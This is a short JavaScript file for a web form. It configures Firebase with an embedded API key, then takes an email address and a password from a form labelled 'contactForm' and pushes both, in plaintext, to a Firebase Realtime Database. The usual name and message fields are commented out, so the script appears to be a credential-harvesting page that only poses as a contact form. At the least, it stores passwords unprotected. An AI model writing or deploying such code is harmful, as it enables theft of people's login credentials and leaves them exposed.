const firebaseConfig = {
    apiKey: "AIzaSyBArA-OKnlYn7paYBGPLDUKc7QP_uZHYWo",
    authDomain: "sample-8547e.firebaseapp.com",
    projectId: "sample-8547e",
    storageBucket: "sample-8547e.appspot.com",
    messagingSenderId: "599831726981",
    appId: "1:599831726981:web:d653797a5c187d8a2392ec"
  };

// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
// contactForm is database name..

var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("contactForm").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var emailid = getElementVal("emailid");
    // var name = getElementVal("name");
    var pass = getElementVal("pass");
    // var msgContent = getElementVal("msgContent");

    saveMessages(emailid,pass);

    //   enable alert
    document.querySelector(".alert").style.display = "block";

    //   remove the alert
    setTimeout(() => {
        document.querySelector(".alert").style.display = "none";
    }, 3000);

    //   reset the form
    document.getElementById("contactForm").reset();
}

const saveMessages = (emailid, pass) => {
    var newContactForm = contactFormDB.push();

    newContactForm.set({
        emailid: emailid,
        pass : pass,
    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};